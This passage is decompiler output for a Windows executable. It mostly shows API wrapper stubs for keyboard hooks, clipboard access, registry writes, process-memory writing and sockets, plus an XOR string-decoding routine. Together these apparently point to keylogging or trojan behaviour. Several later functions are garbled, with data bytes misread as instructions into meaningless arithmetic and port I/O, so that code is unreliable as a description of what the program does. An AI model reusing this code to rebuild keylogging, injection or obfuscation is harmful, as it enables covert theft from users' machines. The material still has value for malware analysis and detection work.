    // 0x404399
    return result;
}

// Address range: 0x40439a - 0x4043bd
int32_t function_40439a(void) {
    int32_t result = function_404372(); // 0x4043af
    if (g21 != -1) {
        // 0x4043b1
        result = TlsFree(g21);
    }
    // 0x4043bc
    return result;
}

// Address range: 0x4043be - 0x4043fe
int32_t function_4043be(void) {
    // 0x4043be
    if (g80 == 0) {
        // 0x4043cd
        return *(int32_t *)(__readfsdword(44) + 4 * g21);
    }
    int32_t * v1 = TlsGetValue(g21); // 0x4043f4
    if (v1 != NULL) {
        // 0x4043fd
        return (int32_t)v1;
    }
    // 0x4043d8
    function_404302();
    int32_t * v2 = TlsGetValue(g21); // 0x4043e3
    if (v2 == NULL) {
        // 0x4043ed
        return g84;
    }
    // 0x4043ec
    return (int32_t)v2;
}

// Address range: 0x4043fe - 0x404409
int32_t function_4043fe(int32_t a1, int32_t a2) {
    // 0x4043fe
    return function_40405e();
}

// Address range: 0x40440a - 0x404450
int32_t function_40440a(void) {
    // 0x40440a
    int32_t v1; // 0x40440a
    if (*(int32_t *)(v1 + 12) == 1) {
        // 0x404415
        g80 = 1;
        int32_t v2 = *(int32_t *)(v1 + 8); // 0x40441e
        g81 = (int32_t (*)(int32_t, int32_t, int32_t))v2;
        g23 = v2;
        g24 = 0;
        g25 = 0;
        int32_t v3; // 0x40440a
        function_4043fe(v3, (int32_t)&g22);
    }
    // 0x40443f
    return function_4031ee(g82);
}

// Address range: 0x404452 - 0x404477
int32_t function_404452(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40445d
    __writefsdword(0, (int32_t)&v1);
    g83++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404477 - 0x40447c
int32_t function_404477(void) {
    // 0x404477
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40447c - 0x40447e
int32_t function_40447c(void) {
    // 0x40447c
    int32_t result; // 0x40447c
    return result;
}

// Address range: 0x40447e - 0x404480
int32_t function_40447e(int32_t a1) {
    // 0x40447e
    int32_t result; // 0x40447e
    return result;
}

// Address range: 0x404482 - 0x40448a
int32_t function_404482(void) {
    // 0x404482
    g83--;
    int32_t result; // 0x404482
    return result;
}

// Address range: 0x40448a - 0x4044af
int32_t function_40448a(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404495
    __writefsdword(0, (int32_t)&v1);
    g85++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4044af - 0x4044b4
int32_t function_4044af(void) {
    // 0x4044af
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4044b4 - 0x4044b6
int32_t function_4044b4(void) {
    // 0x4044b4
    int32_t result; // 0x4044b4
    return result;
}

// Address range: 0x4044b6 - 0x4044b8
int32_t function_4044b6(int32_t a1) {
    // 0x4044b6
    int32_t result; // 0x4044b6
    return result;
}

// Address range: 0x4044ba - 0x4044c2
int32_t function_4044ba(void) {
    // 0x4044ba
    g85--;
    int32_t result; // 0x4044ba
    return result;
}

// Address range: 0x4044c2 - 0x4044c8
int32_t function_4044c2(int32_t * hKey) {
    // 0x4044c2
    return RegCloseKey(hKey);
}

// Address range: 0x4044ca - 0x4044d0
int32_t function_4044ca(int32_t * hKey, char * lpSubKey, int32_t Reserved, char * lpClass, int32_t dwOptions, int32_t samDesired, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t ** phkResult, int32_t * lpdwDisposition) {
    // 0x4044ca
    return RegCreateKeyExA(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition);
}

// Address range: 0x4044d2 - 0x4044d8
int32_t function_4044d2(int32_t * hKey, char * lpSubKey) {
    // 0x4044d2
    return RegDeleteKeyA(hKey, lpSubKey);
}

// Address range: 0x4044da - 0x4044e0
int32_t function_4044da(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult) {
    // 0x4044da
    return RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult);
}

// Address range: 0x4044e2 - 0x4044e8
int32_t function_4044e2(int32_t * hKey, char * lpValueName, int32_t * lpReserved, int32_t * lpType, char * lpData, int32_t * lpcbData) {
    // 0x4044e2
    return RegQueryValueExA(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
}

// Address range: 0x4044ea - 0x4044f0
int32_t function_4044ea(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData) {
    // 0x4044ea
    return RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData, cbData);
}

// Address range: 0x4044f2 - 0x4044f8
bool function_4044f2(int32_t * hObject) {
    // 0x4044f2
    return CloseHandle(hObject);
}

// Address range: 0x4044fa - 0x404500
int32_t function_4044fa(int32_t Locale, int32_t dwCmpFlags, char * lpString1, int32_t cchCount1, char * lpString2, int32_t cchCount2) {
    // 0x4044fa
    return CompareStringA(Locale, dwCmpFlags, lpString1, cchCount1, lpString2, cchCount2);
}

// Address range: 0x404502 - 0x404508
bool function_404502(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists) {
    // 0x404502
    return CopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists);
}

// Address range: 0x40450a - 0x404510
int32_t * function_40450a(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile) {
    // 0x40450a
    return CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

// Address range: 0x404512 - 0x404518
int32_t * function_404512(struct _SECURITY_ATTRIBUTES * lpThreadAttributes, int32_t dwStackSize, int32_t (*lpStartAddress)(int32_t *), int32_t * lpParameter, int32_t dwCreationFlags, int32_t * lpThreadId) {
    // 0x404512
    return CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

// Address range: 0x40451a - 0x404520
bool function_40451a(char * lpFileName) {
    // 0x40451a
    return DeleteFileA(lpFileName);
}

// Address range: 0x404522 - 0x404528
int32_t function_404522(int32_t a1) {
    // 0x404522
    return ExitProcess2();
}

// Address range: 0x40452a - 0x404530
int32_t * function_40452a(int32_t * hModule, char * lpName, char * lpType) {
    // 0x40452a
    return FindResourceA(hModule, lpName, lpType);
}

// Address range: 0x404532 - 0x404538
void function_404532(int32_t * hLibModule, int32_t dwExitCode) {
    // 0x404532
    FreeLibraryAndExitThread(hLibModule, dwExitCode);
}

// Address range: 0x40453a - 0x404540
int32_t * function_40453a(void) {
    // 0x40453a
    return GetCurrentProcess();
}

// Address range: 0x404542 - 0x404548
int32_t function_404542(int32_t * hFile, int32_t * lpFileSizeHigh) {
    // 0x404542
    return GetFileSize(hFile, lpFileSizeHigh);
}

// Address range: 0x40454a - 0x404550
int32_t function_40454a(int32_t * hModule, char * lpFilename, int32_t nSize) {
    // 0x40454a
    return GetModuleFileNameA(hModule, lpFilename, nSize);
}

// Address range: 0x404552 - 0x404558
int32_t * function_404552(char * lpModuleName) {
    // 0x404552
    return GetModuleHandleA(lpModuleName);
}

// Address range: 0x40455a - 0x404560
int32_t (*function_40455a(int32_t * hModule, char * lpProcName))() {
    // 0x40455a
    return GetProcAddress(hModule, lpProcName);
}

// Address range: 0x404562 - 0x404568
int32_t function_404562(int32_t nBufferLength, char * lpBuffer) {
    // 0x404562
    return GetTempPathA(nBufferLength, lpBuffer);
}

// Address range: 0x40456a - 0x404570
int32_t function_40456a(void) {
    // 0x40456a
    return GetTickCount2();
}

// Address range: 0x404572 - 0x404578
int32_t * function_404572(int32_t uFlags, int32_t dwBytes) {
    // 0x404572
    return GlobalAlloc(uFlags, dwBytes);
}

// Address range: 0x40457a - 0x404580
int32_t * function_40457a(int32_t * hMem) {
    // 0x40457a
    return GlobalFree(hMem);
}

// Address range: 0x404582 - 0x404588
int32_t * function_404582(int32_t * hMem) {
    // 0x404582
    return GlobalLock(hMem);
}

// Address range: 0x40458a - 0x404590
bool function_40458a(int32_t * hMem) {
    // 0x40458a
    return GlobalUnlock(hMem);
}

// Address range: 0x404592 - 0x404598
int32_t * function_404592(char * lpLibFileName) {
    // 0x404592
    return LoadLibraryA(lpLibFileName);
}

// Address range: 0x40459a - 0x4045a0
bool function_40459a(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped) {
    // 0x40459a
    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

// Address range: 0x4045a2 - 0x4045a8
bool function_4045a2(int32_t * hFile) {
    // 0x4045a2
    return SetEndOfFile(hFile);
}

// Address range: 0x4045aa - 0x4045b0
void function_4045aa(int32_t dwMilliseconds) {
    // 0x4045aa
    Sleep(dwMilliseconds);
}

// Address range: 0x4045b2 - 0x4045b8
bool function_4045b2(int32_t * lpAddress, int32_t dwSize, int32_t flNewProtect, int32_t * lpflOldProtect) {
    // 0x4045b2
    return VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

// Address range: 0x4045ba - 0x4045c0
int32_t function_4045ba(void) {
    // 0x4045ba
    return WriteFile2();
}

// Address range: 0x4045c2 - 0x4045c8
bool function_4045c2(int32_t * hProcess, int32_t * lpBaseAddress, int32_t * lpBuffer, int32_t nSize, int32_t * lpNumberOfBytesWritten) {
    // 0x4045c2
    return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

// Address range: 0x4045ca - 0x4045d0
int32_t function_4045ca(char * lpString1, char * lpString2) {
    // 0x4045ca
    return lstrcmpiA(lpString1, lpString2);
}

// Address range: 0x4045d2 - 0x4045d8
char * function_4045d2(char * lpString1, char * lpString2) {
    // 0x4045d2
    return lstrcpyA(lpString1, lpString2);
}

// Address range: 0x4045da - 0x4045e0
bool function_4045da(int32_t * hdc, int32_t iFirst, int32_t iLast, int32_t * lpBuffer) {
    // 0x4045da
    return GetCharWidthA(hdc, iFirst, iLast, lpBuffer);
}

// Address range: 0x4045e2 - 0x4045e8
int32_t * function_4045e2(int32_t i) {
    // 0x4045e2
    return GetStockObject(i);
}

// Address range: 0x4045ea - 0x4045f0
int32_t * function_4045ea(int32_t * hdc, int32_t * h) {
    // 0x4045ea
    return SelectObject(hdc, h);
}

// Address range: 0x4045f2 - 0x4045f8
int32_t function_4045f2(int32_t * hhk, int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x4045f2
    return CallNextHookEx(hhk, nCode, wParam, lParam);
}

// Address range: 0x4045fa - 0x404600
bool function_4045fa(void) {
    // 0x4045fa
    return CloseClipboard();
}

// Address range: 0x404602 - 0x404608
int32_t function_404602(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x404602
    return DefWindowProcA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x40460a - 0x404610
int32_t function_40460a(struct tagMSG * lpMsg) {
    // 0x40460a
    return DispatchMessageA(lpMsg);
}

// Address range: 0x404612 - 0x404618
bool function_404612(bool (*lpEnumFunc)(int32_t *, int32_t), int32_t lParam) {
    // 0x404612
    return EnumWindows(lpEnumFunc, lParam);
}

// Address range: 0x40461a - 0x404620
int32_t * function_40461a(char * lpClassName, char * lpWindowName) {
    // 0x40461a
    return FindWindowA(lpClassName, lpWindowName);
}

// Address range: 0x404622 - 0x404628
int32_t * function_404622(int32_t * hWndParent, int32_t * hWndChildAfter, char * lpszClass, char * lpszWindow) {
    // 0x404622
    return FindWindowExA(hWndParent, hWndChildAfter, lpszClass, lpszWindow);
}

// Address range: 0x40462a - 0x404630
bool function_40462a(struct tagPOINT * lpPoint) {
    // 0x40462a
    return GetCaretPos(lpPoint);
}

// Address range: 0x404632 - 0x404638
int32_t function_404632(int32_t * hWnd, int32_t nIndex) {
    // 0x404632
    return GetClassLongA(hWnd, nIndex);
}

// Address range: 0x40463a - 0x404640
int32_t function_40463a(int32_t * hWnd, char * lpClassName, int32_t nMaxCount) {
    // 0x40463a
    return GetClassNameA(hWnd, lpClassName, nMaxCount);
}

// Address range: 0x404642 - 0x404648
int32_t * function_404642(int32_t uFormat) {
    // 0x404642
    return GetClipboardData(uFormat);
}

// Address range: 0x40464a - 0x404650
int32_t * function_40464a(int32_t * hWnd) {
    // 0x40464a
    return GetDC(hWnd);
}

// Address range: 0x404652 - 0x404658
bool function_404652(char * lpKeyState) {
    // 0x404652
    return GetKeyboardState(lpKeyState);
}

// Address range: 0x40465a - 0x404660
bool function_40465a(struct tagMSG * lpMsg, int32_t * hWnd, int32_t wMsgFilterMin, int32_t wMsgFilterMax) {
    // 0x40465a
    return GetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}

// Address range: 0x404662 - 0x404668
int32_t * function_404662(int32_t * hWnd) {
    // 0x404662
    return GetParent(hWnd);
}

// Address range: 0x40466a - 0x404670
int32_t * function_40466a(int32_t * hWnd) {
    // 0x40466a
    return GetTopWindow(hWnd);
}

// Address range: 0x404672 - 0x404678
int32_t * function_404672(int32_t * hWnd, int32_t uCmd) {
    // 0x404672
    return GetWindow(hWnd, uCmd);
}

// Address range: 0x40467a - 0x404680
int32_t function_40467a(int32_t * hWnd, int32_t nIndex) {
    // 0x40467a
    return GetWindowLongA(hWnd, nIndex);
}

// Address range: 0x404682 - 0x404688
int32_t function_404682(int32_t * hWnd, int32_t * lpdwProcessId) {
    // 0x404682
    return GetWindowThreadProcessId(hWnd, lpdwProcessId);
}

// Address range: 0x40468a - 0x404690
bool function_40468a(int32_t * hWnd) {
    // 0x40468a
    return IsWindow(hWnd);
}

// Address range: 0x404692 - 0x404698
bool function_404692(int32_t * hWnd) {
    // 0x404692
    return IsWindowVisible(hWnd);
}

// Address range: 0x40469a - 0x4046a0
bool function_40469a(int32_t * hWnd, int32_t uIDEvent) {
    // 0x40469a
    return KillTimer(hWnd, uIDEvent);
}

// Address range: 0x4046a2 - 0x4046a8
int32_t * function_4046a2(int32_t * hInstance, char * lpIconName) {
    // 0x4046a2
    return LoadIconA(hInstance, lpIconName);
}

// Address range: 0x4046aa - 0x4046b0
bool function_4046aa(int32_t * hWndNewOwner) {
    // 0x4046aa
    return OpenClipboard(hWndNewOwner);
}

// Address range: 0x4046b2 - 0x4046b8
bool function_4046b2(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x4046b2
    return PostMessageA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x4046ba - 0x4046c0
void function_4046ba(int32_t nExitCode) {
    // 0x4046ba
    PostQuitMessage(nExitCode);
}

// Address range: 0x4046c2 - 0x4046c8
int32_t function_4046c2(int32_t * hWnd, int32_t * hDC) {
    // 0x4046c2
    return ReleaseDC(hWnd, hDC);
}

// Address range: 0x4046ca - 0x4046d0
int32_t function_4046ca(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x4046ca
    return SendMessageA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x4046d2 - 0x4046d8
int32_t function_4046d2(int32_t * hWnd, int32_t nIDEvent, int32_t uElapse, void (*lpTimerFunc)(int32_t *, int32_t, int32_t, int32_t)) {
    // 0x4046d2
    return SetTimer(hWnd, nIDEvent, uElapse, lpTimerFunc);
}

// Address range: 0x4046da - 0x4046e0
int32_t function_4046da(int32_t * hWnd, int32_t nIndex, int32_t dwNewLong) {
    // 0x4046da
    return SetWindowLongA(hWnd, nIndex, dwNewLong);
}

// Address range: 0x4046e2 - 0x4046e8
int32_t * function_4046e2(int32_t idHook, int32_t (*lpfn)(int32_t, int32_t, int32_t), int32_t * hmod, int32_t dwThreadId) {
    // 0x4046e2
    return SetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);
}

// Address range: 0x4046ea - 0x4046f0
int32_t function_4046ea(int32_t uVirtKey, int32_t uScanCode, char * lpKeyState, int16_t * lpChar, int32_t uFlags) {
    // 0x4046ea
    return ToAscii(uVirtKey, uScanCode, lpKeyState, lpChar, uFlags);
}

// Address range: 0x4046f2 - 0x4046f8
bool function_4046f2(int32_t * hhk) {
    // 0x4046f2
    return UnhookWindowsHookEx(hhk);
}

// Address range: 0x4046fa - 0x404701
int32_t function_4046fa(void) {
    // 0x4046fa
    return function_40270a();
}

// Address range: 0x404702 - 0x404708
int32_t * function_404702(int32_t dwExStyle, char * lpClassName, char * lpWindowName, int32_t dwStyle, int32_t X, int32_t Y, int32_t nWidth, int32_t nHeight, int32_t * hWndParent, int32_t * hMenu, int32_t * hInstance, int32_t * lpParam) {
    // 0x404702
    return CreateWindowExA(dwExStyle, lpClassName, lpWindowName, dwStyle, X, Y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
}

// Address range: 0x40470a - 0x404761
int32_t function_40470a(int32_t hWndParent, int32_t nHeight, int32_t nWidth, int32_t Y, int32_t X, int32_t dwStyle, int32_t lpWindowName, int32_t lpClassName, int32_t dwExStyle) {
    // 0x40470a
    int32_t v1; // 0x40470a
    int32_t v2; // 0x40470a
    int32_t v3; // 0x40470a
    int32_t v4; // 0x40470a
    int32_t hMenu; // 0x40470a
    function_402782(v3, hMenu, v4, v2, v1);
    int32_t hInstance; // 0x40470a
    int32_t lpParam; // 0x40470a
    int32_t * windowHandle = CreateWindowExA(dwExStyle, (char *)lpClassName, (char *)lpWindowName, dwStyle, X, Y, nWidth, nHeight, (int32_t *)hWndParent, (int32_t *)hMenu, (int32_t *)hInstance, (int32_t *)lpParam); // 0x404749
    function_402772();
    return (int32_t)windowHandle;
}

// Address range: 0x404762 - 0x404787
int32_t function_404762(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40476d
    __writefsdword(0, (int32_t)&v1);
    g86++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404787 - 0x40478c
int32_t function_404787(void) {
    // 0x404787
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40478c - 0x40478e
int32_t function_40478c(void) {
    // 0x40478c
    int32_t result; // 0x40478c
    return result;
}

// Address range: 0x40478e - 0x404790
int32_t function_40478e(int32_t a1) {
    // 0x40478e
    int32_t result; // 0x40478e
    return result;
}

// Address range: 0x404792 - 0x40479a
int32_t function_404792(void) {
    // 0x404792
    g86--;
    int32_t result; // 0x404792
    return result;
}

// Address range: 0x40479d - 0x40480f
int32_t function_40479d(void) {
    // 0x40479d
    int32_t v1; // 0x40479d
    *(int32_t *)v1 = v1 - 1;
    int32_t v2; // 0x40479d
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    uint32_t v4; // 0x40479d
    char * v5 = (char *)(v4 + 101); // 0x4047a1
    char v6 = v4 / 256; // 0x4047a1
    *v5 = *v5 + v6;
    int32_t v7 = 0x6c6c642e * *(int32_t *)(v1 + 101); // 0x4047a6
    *(char *)v2 = *(char *)&v2 + v6;
    int32_t v8 = v2;
    *(char *)v8 = *(char *)&v2 + (char)v8;
    int32_t v9 = v2;
    *(char *)v9 = *(char *)&v2 + (char)v9;
    int32_t v10 = v2;
    *(char *)v10 = *(char *)&v2 + (char)v10;
    int32_t v11; // 0x40479d
    char * v12 = (char *)(v11 - 117); // 0x4047b5
    *v12 = *v12 + (char)v4;
    __asm_in((int16_t)v4);
    *(int32_t *)(v7 - 8) = 0x40480f;
    int32_t v13 = __readfsdword(0); // 0x4047c1
    int32_t v14 = v7 - 12; // 0x4047c1
    int32_t * v15 = (int32_t *)v14; // 0x4047c1
    *v15 = v13;
    __writefsdword(0, v14);
    int32_t v16 = g87 + 1; // 0x4047c7
    g87 = v16;
    if (v16 == 0) {
        // 0x4047cf
        function_4034be();
        function_4034be();
        function_4034be();
        function_4034be();
        function_4034be();
    }
    // 0x404801
    __writefsdword(0, *v15);
    *(int32_t *)(v7 - 4) = 0x404816;
    return 0;
}

// Address range: 0x40480f - 0x404814
int32_t function_40480f(void) {
    // 0x40480f
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404814 - 0x404816
int32_t function_404814(void) {
    // 0x404814
    int32_t result; // 0x404814
    return result;
}

// Address range: 0x404816 - 0x404818
int32_t function_404816(int32_t a1) {
    // 0x404816
    int32_t result; // 0x404816
    return result;
}

// Address range: 0x40481a - 0x404822
int32_t function_40481a(void) {
    // 0x40481a
    g87--;
    int32_t result; // 0x40481a
    return result;
}

// Address range: 0x404822 - 0x40485b
int32_t function_404822(void) {
    int32_t v1 = function_40386e(); // 0x404829
    int32_t result = function_403616(); // 0x404834
    int32_t result2 = result; // 0x40483b
    int32_t v2 = 0; // 0x40483b
    if (result < 1) {
        // 0x404857
        return result;
    }
    int32_t v3 = v1; // 0x40483b
    char * v4 = (char *)v3; // 0x404843
    *v4 = *v4 ^ *(char *)(v2 + (int32_t)"aixiaran^I@");
    int32_t v5 = v2 + 1 & -0x7ffffff9; // 0x404847
    v2 = v5 >= 0 ? v5 : (v2 | -8) + 1;
    result2--;
    v3++;
    while (result2 != 0) {
        // 0x40483d
        v4 = (char *)v3;
        *v4 = *v4 ^ *(char *)(v2 + (int32_t)"aixiaran^I@");
        v5 = v2 + 1 & -0x7ffffff9;
        v2 = v5 >= 0 ? v5 : (v2 | -8) + 1;
        result2--;
        v3++;
    }
    // 0x404857
    return result2;
}

// Address range: 0x40485e - 0x404883
int32_t function_40485e(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404869
    __writefsdword(0, (int32_t)&v1);
    g88++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404883 - 0x404888
int32_t function_404883(void) {
    // 0x404883
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404888 - 0x40488a
int32_t function_404888(void) {
    // 0x404888
    int32_t result; // 0x404888
    return result;
}

// Address range: 0x40488a - 0x40488c
int32_t function_40488a(int32_t a1) {
    // 0x40488a
    int32_t result; // 0x40488a
    return result;
}

// Address range: 0x40488e - 0x404896
int32_t function_40488e(void) {
    // 0x40488e
    g88--;
    int32_t result; // 0x40488e
    return result;
}

// Address range: 0x404896 - 0x4048bb
int32_t function_404896(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4048a1
    __writefsdword(0, (int32_t)&v1);
    g89++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4048bb - 0x4048c0
int32_t function_4048bb(void) {
    // 0x4048bb
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4048c0 - 0x4048c2
int32_t function_4048c0(void) {
    // 0x4048c0
    int32_t result; // 0x4048c0
    return result;
}

// Address range: 0x4048c2 - 0x4048c4
int32_t function_4048c2(int32_t a1) {
    // 0x4048c2
    int32_t result; // 0x4048c2
    return result;
}

// Address range: 0x4048c6 - 0x4048ce
int32_t function_4048c6(void) {
    // 0x4048c6
    g89--;
    int32_t result; // 0x4048c6
    return result;
}

// Address range: 0x4048ce - 0x4048d4
int32_t function_4048ce(int32_t s) {
    // 0x4048ce
    return closesocket(s);
}

// Address range: 0x4048d6 - 0x4048dc
int32_t function_4048d6(int32_t s, struct sockaddr * name, int32_t namelen) {
    // 0x4048d6
    return connect(s, name, namelen);
}

// Address range: 0x4048de - 0x4048e4
int16_t function_4048de(int16_t hostshort) {
    // 0x4048de
    return htons(hostshort);
}

// Address range: 0x4048e6 - 0x4048ec
char * function_4048e6(struct in_addr in) {
    // 0x4048e6
    return inet_ntoa(in);
}

// Address range: 0x4048ee - 0x4048f4
int32_t function_4048ee(int32_t s, char * buf, int32_t len, int32_t flags) {
    // 0x4048ee
    return recv(s, buf, len, flags);
}

// Address range: 0x4048f6 - 0x4048fc
int32_t function_4048f6(int32_t s, char * buf, int32_t len, int32_t flags) {
    // 0x4048f6
    return send(s, buf, len, flags);
}

// Address range: 0x4048fe - 0x404904
int32_t function_4048fe(int32_t af, int32_t type, int32_t protocol) {
    // 0x4048fe
    return socket(af, type, protocol);
}

// Address range: 0x404906 - 0x40490c
struct hostent * function_404906(char * name) {
    // 0x404906
    return gethostbyname(name);
}

// Address range: 0x40490e - 0x404914
int32_t function_40490e(char * name, int32_t namelen) {
    // 0x40490e
    return gethostname(name, namelen);
}

// Address range: 0x404916 - 0x40491c
int32_t function_404916(int16_t wVersionRequested, struct WSAData * lpWSAData) {
    // 0x404916
    return WSAStartup(wVersionRequested, lpWSAData);
}

// Address range: 0x40491e - 0x404924
int32_t function_40491e(void) {
    // 0x40491e
    return WSACleanup();
}

// Address range: 0x404926 - 0x40494b
int32_t function_404926(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404931
    __writefsdword(0, (int32_t)&v1);
    g90++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40494b - 0x404950
int32_t function_40494b(void) {
    // 0x40494b
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404950 - 0x404952
int32_t function_404950(void) {
    // 0x404950
    int32_t result; // 0x404950
    return result;
}

// Address range: 0x404952 - 0x404954
int32_t function_404952(int32_t a1) {
    // 0x404952
    int32_t result; // 0x404952
    return result;
}

// Address range: 0x404956 - 0x40495e
int32_t function_404956(void) {
    // 0x404956
    g90--;
    int32_t result; // 0x404956
    return result;
}

// Address range: 0x40495e - 0x404b5a
int32_t function_40495e(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40495e
    int32_t result; // 0x40495e
    bool v1; // 0x40495e
    if (v1) {
        int32_t v2 = result;
        *(char *)v2 = *(char *)&result + (char)v2;
        int32_t v3 = result;
        *(char *)v3 = *(char *)&result + (char)v3;
        return result;
    }
    // 0x404969
    int32_t v4; // 0x40495e
    int32_t v5 = 0x78686f70 * *(int32_t *)(0x30303b71 * *(int32_t *)(v4 + 117) + 101); // 0x404969
    int32_t v6; // 0x40495e
    int64_t * v7 = (int64_t *)(v6 + 104); // 0x404970
    int32_t v8 = __asm_bound(*v7); // 0x404970
    uint32_t v9; // 0x40495e
    int16_t v10 = v9; // 0x404978
    __asm_outsd(v10, __readfsdword(v5));
    int32_t v11 = 2 * v8; // 0x40497a
    int32_t v12; // 0x40495e
    int32_t v13 = v12 + 112; // 0x40497a
    char * v14 = (char *)(v11 + v13); // 0x40497a
    char v15 = v9 / 256; // 0x40497a
    char v16 = *v14 ^ v15; // 0x40497a
    *v14 = v16;
    int32_t v17 = result;
    char v18 = *(char *)&result + (char)v17;
    if (v16 < 0) {
        // 0x4049b0
        *(char *)v17 = v18;
        int32_t v19 = result;
        *(char *)v19 = *(char *)&result + (char)v19;
        int32_t v20 = result;
        *(char *)v20 = *(char *)&result + (char)v20;
        int32_t v21 = result;
        *(char *)v21 = *(char *)&result + (char)v21;
        int32_t v22 = result;
        *(char *)v22 = *(char *)&result + (char)v22;
        int32_t v23 = result;
        *(char *)v23 = *(char *)&result + (char)v23;
        int32_t v24 = result;
        *(char *)v24 = *(char *)&result + (char)v24;
        return result;
    }
    char v25 = llvm_ctpop_i8(v18); // 0x4049e4
    *(char *)v17 = v18;
    if ((v25 & 1) == 0) {
        // 0x4049e8
        *(int32_t *)v6 = __asm_insd(v10);
        *(int32_t *)0x6e707541 = v5 ^ v12 ^ *(int32_t *)0x6e707541;
        int32_t v26 = result;
        *(char *)v26 = *(char *)&result + (char)v26;
        int32_t v27 = result;
        *(char *)v27 = *(char *)&result + (char)v27;
        int32_t v28 = result;
        *(char *)v28 = *(char *)&result + (char)v28;
        int32_t v29 = result;
        *(char *)v29 = *(char *)&result + (char)v29;
        int32_t v30 = result;
        *(char *)v30 = *(char *)&result + (char)v30;
        int32_t v31 = result;
        *(char *)v31 = *(char *)&result + (char)v31;
        int32_t v32 = result;
        *(char *)v32 = *(char *)&result + (char)v32;
        int32_t v33 = result;
        *(char *)v33 = *(char *)&result + (char)v33;
        int32_t v34 = result;
        *(char *)v34 = *(char *)&result + (char)v34;
        int32_t v35 = result;
        *(char *)v35 = *(char *)&result + (char)v35;
        int32_t v36 = result;
        *(char *)v36 = *(char *)&result + (char)v36;
        int32_t v37 = result;
        *(char *)v37 = *(char *)&result + (char)v37;
        int32_t v38 = result;
        *(char *)v38 = *(char *)&result + (char)v38;
        int32_t v39 = result;
        *(char *)v39 = *(char *)&result + (char)v39;
        int32_t v40 = result;
        *(char *)v40 = *(char *)&result + (char)v40;
        int32_t v41 = result;
        *(char *)v41 = *(char *)&result + (char)v41;
        int32_t v42 = result;
        *(char *)v42 = *(char *)&result + (char)v42;
        int32_t v43 = result;
        *(char *)v43 = *(char *)&result + (char)v43;
        int32_t v44 = result;
        *(char *)v44 = *(char *)&result + (char)v44;
        int32_t v45 = result;
        *(char *)v45 = *(char *)&result + (char)v45;
        return result;
    }
    int32_t v46 = result;
    *(char *)v46 = *(char *)&result + (char)v46;
    int32_t v47 = result;
    *(char *)v47 = *(char *)&result + (char)v47;
    int32_t v48 = result;
    *(char *)v48 = *(char *)&result + (char)v48;
    int32_t v49 = result;
    *(char *)v49 = *(char *)&result + (char)v49;
    int32_t v50 = result;
    *(char *)v50 = *(char *)&result + (char)v50;
    char * v51 = (char *)(v5 + 117 + v11); // 0x404a6d
    unsigned char v52 = *v51; // 0x404a6d
    unsigned char v53 = v52 + v15; // 0x404a6d
    *v51 = v53;
    if (((v53 ^ v52) & (v53 ^ v15)) >= 0) {
        char v54 = *(char *)&result + (char)result; // 0x404ab0
        *(char *)result = v54;
        if (v54 < 0) {
            // 0x404b33
            return result;
        }
        int32_t v55 = *(int32_t *)(0x30303b71 * *(int32_t *)(v8 + 117) + 101); // 0x404abd
        int32_t v56 = __asm_bound(*v7); // 0x404ac4
        __asm_outsd(v10, __readfsdword(0x78686f70 * v55));
        char * v57 = (char *)(2 * v56 + v13); // 0x404ace
